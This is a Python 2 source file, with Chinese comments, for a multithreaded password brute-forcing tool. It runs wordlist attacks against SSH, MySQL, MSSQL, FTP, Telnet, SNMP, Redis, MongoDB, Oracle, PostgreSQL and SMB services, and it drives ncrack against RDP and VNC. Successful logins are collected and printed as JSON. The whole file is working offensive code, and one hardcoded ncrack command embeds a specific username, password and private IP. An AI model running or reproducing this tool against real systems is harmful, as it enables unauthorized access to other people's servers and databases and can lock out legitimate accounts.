# coding=utf-8

import Queue
import sys
import redis
import cx_Oracle
from smb.SMBConnection import SMBConnection
from pysnmp.entity.rfc3413.oneliner import cmdgen
import telnetlib
import ftplib
import pymssql
import pymysql
import threadpool
import time
import socket
import hashlib
import binascii
import json
import os
import paramiko
import subprocess
import shlex
paramiko.util.logging.getLogger('paramiko.transport').addHandler(
    paramiko.util.logging.NullHandler())


queue = Queue.Queue()


class Worker(object):

    @classmethod
    def burst(cls, thread_num, worker_func, var_list):
        '''
        启动thread_num个线程然后启动使用列表触发函数
        :param thread_num:
        :param worker_func:
        :param name_list:
        :return:
        '''
        if not isinstance(var_list, list):
            print str(var_list) + " is not list!"
            return
        pool = threadpool.ThreadPool(int(thread_num))
        requests = threadpool.makeRequests(worker_func, var_list)
        [pool.putRequest(req) for req in requests]
        pool.poll()
        pool.wait()

    @classmethod
    def createtask(cls, ip, port, username_file, password_file):
        '''
        根据输入的内容返回一个任务列表，列表中每项为一个json数据
        :param ip:
        :param port:
        :param username_file:
        :param password_file:
        :return:
        '''
        result_list = []
        task_dict = {}
        task_dict['ip'] = ip
        task_dict['port'] = int(port)
        file_usename = open(os.path.abspath('.') + os.sep + username_file, 'r')
        file_password = open(
            os.path.abspath('.') +
            os.sep +
            password_file,
            'r')
        username_list = file_usename.readlines()
        password_list = file_password.readlines()
        username_list_new = []
        password_list_new = []
        # 字典去重
        for username in username_list:
            if username not in username_list_new:
                username_list_new.append(username)
        for password in password_list:
            if password not in password_list_new:
                password_list_new.append(password)
        for username in username_list_new:
            if '\n' in username:
                username = username.replace('\n', '')
                if '\r' in username:
                    username = username.replace('\r', '')
            if username == '' or username is None:
                username = ''
            task_dict['username'] = username
            for password in password_list_new:
                if '\n' in password:
                    password = password.replace('\n', '')
                    if '\r' in password:
                        password = password.replace('\r', '')
                if password == '' or password is None:
                    password = ''
                task_dict['password'] = password
                new_dict = task_dict.copy()
                result_list.append((None, new_dict))
        return result_list

    @classmethod
    def attack(
            cls,
            service,
            thread_num,
            ip,
            port,
            username_file,
            password_file):
        '''
        主要使用的方法，输入必填选项后根据方法决定返回一个爆破成功的列表，如果是空就是没有爆破成功的。
        :param service:
        :param thread_num:
        :param ip:
        :param port:
        :param username_file:
        :param password_file:
        :return:
        '''
        result_list = []
        print "\033[0;32m----------------------测试开始！---------------------\033[0m"
        start = time.time()
        if service == rdp_burst:
            rdp_burst(
                ip=ip,
                port=port,
                username_file=username_file,
                password_file=password_file,
                thread_num=thread_num)
        elif service == vnc_burst:
            vnc_burst(
                ip=ip,
                port=port,
                username_file=username_file,
                password_file=password_file,
                thread_num=thread_num)
        else:
            params_list = Worker.createtask(
                ip=ip,
                port=port,
                username_file=username_file,
                password_file=password_file)
            print "\033[0;35m测试账号密码组合计{}个\033[0m".format(str(len(params_list)))
            print '\033[0;32m-----------------------分割线-----------------------\033[0m'
            Worker.burst(
                thread_num=int(thread_num),
                worker_func=service,
                var_list=params_list)
        end = time.time()
        print '\033[0;32m-----------------------分割线-----------------------\033[0m'
        print '\033[0;35m总计耗时：' + str(end - start) + '秒\033[0m'
        print '\033[0;32m-----------------------分割线-----------------------\033[0m'
        print '\033[0;35m[信息]测试结果为：\033[0m'
        while not queue.empty():
            result_list.append(queue.get())
        if service == redis_burst:
            for result_use in result_list:
                if result_use['password'] == '':
                    result_list = [result_use]
                    break
        elif service == ftp_burst:
            if result_list[0]['username'] == result_list[0]['password'] == 'anonymous':
                result_list = [result_list[0]]

        return result_list


class NcrackAction():

    @classmethod
    def get_credential(cls, line):
        result = {}
        if 'Discovered' in line and 'rdp://' in line:
            result['username'] = line.split("'")[1]
            result['password'] = line.split("'")[3]
            return result
        elif "vnc" in line:
            return None
        else:
            return None
        return result

    @classmethod
    def ncarck_burst(
            cls,
            service,
            ip,
            username_file,
            password_file,
            port,
            thread_num):
        ca_list = []
        port = str(port)
        only_pass = ['vnc']
        if service in only_pass:
            command = 'ncrack -vv --user administrator --pass windows2008R2 192.168.1.111:3389,CL=1'
        else:
            command = 'ncrack -vv -U {username} -P {password} {ip}:{port},CL={num}'.format(
                username=username_file, password=password_file, ip=ip, port=port, num=str(thread_num))
        print command
        command = shlex.split(command)
        p = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, bufsize=-1)
        for line in iter(p.stdout.readline, b''):
            sys.stdout.flush()
            time.sleep(0.0001)
            print line
            if ('Discovered' in line and 'ms-wbt-server://' in line) or (
                    'Discovered' in line and 'rdp://' in line) or ('The server does not require password' in line):
                result = NcrackAction.get_credential(line=line)
                ca_list.append(result)
        return ca_list


def put_result(ip, port, username, password):
    result = {}
    result['ip'] = ip
    result['port'] = port
    result['username'] = username
    result['password'] = password
    queue.put(result)


def ssh_burst(ip, port, username, password):
    '''ssh爆破,线程数超过三会漏报'''
    # paramiko.transport.Transport.banner_timeout = 300
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(
            ip,
            port,
            username,
            password,
            timeout=5,
            allow_agent=False,
            look_for_keys=False)
        stdin, stdout, stderr = ssh.exec_command('id', timeout=5)
        if stdout.read() != "":
            put_result(ip=ip, port=port, username=username, password=password)
    except Exception as e:
        print e.message
    ssh.close()


def mysql_burst(ip, port, username, password):
    '''mysql爆破'''
    try:
        conn = pymysql.connect(
            host=ip,
            port=int(port),
            user=username,
            password=password,
            database="mysql",
            charset="utf8")
        if conn:
            put_result(ip=ip, port=port, username=username, password=password)
            conn.close()
    except BaseException:
        print "连接失败！"


def mssql_burst(ip, port, username, password):
    '''mssql爆破'''
    try:
        conn = pymssql.connect(
            server=ip,
            port=int(port),
            user=username,
            password=password,
            # database='test',
            timeout=5)
        if conn:
            conn.close()
            put_result(ip=ip, port=port, username=username, password=password)
    except BaseException:
        print "连接失败！"


def ftp_burst(ip, port, username, password):
    '''ftp匿名访问和弱口令爆破'''
    socket.setdefaulttimeout(3)
    try:
        if username == 'anonymous' and password != 'anonymous':
            return
        ftp = ftplib.FTP()
        ftp.set_debuglevel(2)
        ftp.connect(ip, str(port))
        ftp.login(username, password)
        if ftp.getwelcome():
            put_result(ip=ip, port=port, username=username, password=password)
    except BaseException:
        print "连接失败！"


def telnet_burst(ip, port, username, password):
    '''telnet爆破'''
    print '[信息] {username}, {password}'.format(
        username=username, password=password)
    try:
        tn = telnetlib.Telnet(host=ip, port=port, timeout=5)
        tn.read_until('login: ', timeout=2)
        tn.write(username + '\r\n')
        time.sleep(1)
        tn.read_until('Password: ', timeout=2)
        tn.write(password + '\r\n')
        response = tn.read_until(r'[\s\S]+', timeout=2)
        # if response.find('Login Fail') > 0 or response.find('incorrect') > 0:
        #     print 'filed!'
        # else:
        if response.find('Microsoft Telnet Server.') > 0 or response.find(
                'Last login:') > 0:
            put_result(ip=ip, port=port, username=username, password=password)
        tn.close()
    except BaseException:
        pass


def snmp_burst(ip, port, username, password):
    '''snmp服务爆破'''
    username = username  # 无用只是为了统一标准
    try:
        errorIndication, errorStatus, errorIndex, varBinds = \
            cmdgen.CommandGenerator().getCmd(
                cmdgen.CommunityData('my-agent', password, 0),
                cmdgen.UdpTransportTarget((ip, int(port))),
                (1, 3, 6, 1, 2, 1, 1, 1, 0)
            )
        if varBinds:
            put_result(ip=ip, port=port, username=username, password=password)
    except Exception as e:
        pass


def redis_burst(ip, port, username='', password=''):
    '''redis未授权'''
    # socket.setdefaulttimeout(5)
    # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # s.connect((ip, int(port)))
    # s.send('INFO\r\n')
    # response = s.recv(1024)
    # if 'redis_version' in response:
    r = redis.Redis(host=ip, password=password, port=port)
    try:
        info = r.info()
    except BaseException:
        info = None
    if info:
        put_result(ip=ip, port=port, username='redis', password=password)


def mongo_burst(ip, port, username, password):
    '''mongodb未授权爆破'''
    socket.setdefaulttimeout(5)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, int(port)))
    data = binascii.a2b_hex(
        "3a000000a741000000000000d40700000000000061646d696e2e24636d640000000000ffffffff130000001069736d6173746572000100000000")
    s.send(data)
    response = s.recv(1024)
    if "ismaster" in response:
        getlog_data = binascii.a2b_hex(
            "480000000200000000000000d40700000000000061646d696e2e24636d6400000000000100000021000000026765744c6f670010000000737461727475705761726e696e67730000")
        s.send(getlog_data)
        response = s.recv(1024)
        if "totalLinesWritten" in response:
            put_result(ip=ip, port=port, username=username, password=password)


def oracle_burst(ip, port, username, password):
    '''
    爆破oracle数据库弱口令，只爆破oracle一个用户。默认错误10次错误密码锁定账户。
    '''
    try:
        conn_str = '{username}/{password}@{ip}:{port}/ORCL'.format(
            username=username,
            password=password,
            ip=ip,
            port=str(port))
        print conn_str
        time.sleep(1)
        conn = cx_Oracle.connect(conn_str)
        if conn:
            put_result(ip=ip, port=port, username=username, password=password)
            conn.close()
    except Exception as e:
        # print e.message
        pass


# def rsync_burst(ip, port, username, password):
#     '''rsync弱口令爆破'''
#     rwc = RsyncWeakCheck(host=ip, port=port)
#     for path_name in rwc.get_all_pathname():
#         ret = rwc.is_path_not_auth(path_name)
#         if ret == 1:
#             try:
#                 res = rwc.weak_passwd_check(
#                     path_name=path_name, username=username, passwd=password)
#                 if res:
#                     put_result(
#                         ip=ip,
#                         port=port,
#                         username=username,
#                         password=password)
#             except Exception as e:
#                 pass


def make_response(username, password, salt):
    '''postgresql 使用方法'''
    pu = hashlib.md5(password + username).hexdigest()
    buf = hashlib.md5(pu + salt).hexdigest()
    return 'md5' + buf


def postgresql_burst(ip, port, username, password):
    '''postgresql数据库爆破 '''
    try:
        socket.setdefaulttimeout(5)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, int(port)))
        packet_length = len(username) + 7 + len(
            "\x03user  database postgres application_name psql client_encoding UTF8  ")
        p = "%c%c%c%c%c\x03%c%cuser%c%s%cdatabase%cpostgres%capplication_name%cpsql%cclient_encoding%cUTF8%c%c" % (
            0, 0, 0, packet_length, 0, 0, 0, 0, username, 0, 0, 0, 0, 0, 0, 0, 0)
        sock.send(p)
        packet = sock.recv(1024)
        if packet[0] == 'R':
            authentication_type = str([packet[8]])
            c = int(authentication_type[4:6], 16)
            if c == 5:
                salt = packet[9:]
        else:
            return 3
        lmd5 = make_response(username, password, salt)
        packet_length1 = len(lmd5) + 5 + len('p')
        pp = 'p%c%c%c%c%s%c' % (0, 0, 0, packet_length1 - 1, lmd5, 0)
        sock.send(pp)
        packet1 = sock.recv(1024)
        if packet1[0] == "R":
            put_result(ip=ip, port=port, username=username, password=password)
    except Exception as e:
        if "Errno 10061" in str(e) or "timed out" in str(e):
            return 3


def smb_burst(ip, port, username, password):
    '''smb服务匿名爆破和弱口令,账号密码为anymouse时说明未授权'''
    my_name = 'anyname'
    domain_name = ''
    try:
        conn = SMBConnection(
            username,
            password,
            my_name,
            domain_name,
            use_ntlm_v2=True)
        if conn.connect(ip=ip, port=port, timeout=5):
            put_result(ip=ip, port=port, username=username, password=password)
    except Exception as e:
        pass


def rdp_burst(ip, port, username_file, password_file, thread_num):
    '''rdp服务爆破'''
    rdp_result = NcrackAction.ncarck_burst(
        ip=ip,
        port=port,
        service='rdp',
        username_file=username_file,
        password_file=password_file,
        thread_num=thread_num)
    if len(rdp_result) > 0:
        for rdp_use in rdp_result:
            put_result(
                ip=ip,
                port=port,
                username=rdp_use['username'],
                password=rdp_use['password'])
    else:
        print '账号密码未爆破成功！'


def vnc_burst(ip, port, username, password, thread_num):
    '''vnc服务爆破'''
    vnc_result = NcrackAction.ncarck_burst(
        ip=ip,
        port=port,
        service='vnc',
        username=username,
        password=password,
        thread_num=thread_num)
    if len(vnc_result) > 0:
        for vnc_use in vnc_result:
            put_result(
                ip=ip,
                port=port,
                username=vnc_use['username'],
                password=vnc_use['password'])
    else:
        print '密码未爆破成功！'


if __name__ == '__main__':
    # 调用attack方法设置好
    service_dict = {
        "ssh": ssh_burst,
        "mysql": mysql_burst,
        "mssql": mssql_burst,
        "ftp": ftp_burst,
        "telnet": telnet_burst,
        "snmp": snmp_burst,
        "redis": redis_burst,
        "mongo": mongo_burst,
        "oracle": oracle_burst,
        # "rsync": rsync_unauthorized,
        "postgresql": postgresql_burst,
        "smb": smb_burst,
        "rdp": rdp_burst,
        "vnc": vnc_burst
    }
    if len(sys.argv) < 6:
        print(
            "[INFO] USE: python my_entry.py ip port service thread_num username_file password_file")
    else:
        ip = sys.argv[1]
        port = sys.argv[2]
        service = sys.argv[3]
        thrade_num = sys.argv[4]
        username_file = sys.argv[5]
        password_file = sys.argv[6]
        thrade_num = int(thrade_num)
        port = int(port)
        service = service_dict[service]
        print json.dumps(Worker.attack(
            service=service,
            thread_num=thrade_num,
            ip=ip,
            port=port,
            username_file=username_file,
            password_file=password_file), indent=4)
    # print Worker.createtask(ip='192.168.1.107', username_file='username.txt', password_file='password.txt', port=22)
    # print json.dumps(Worker.attack(service=telnet_burst, thread_num=1, ip='192.168.1.103', port=23, username_file='user.txt', password_file='pass.txt'), indent=4)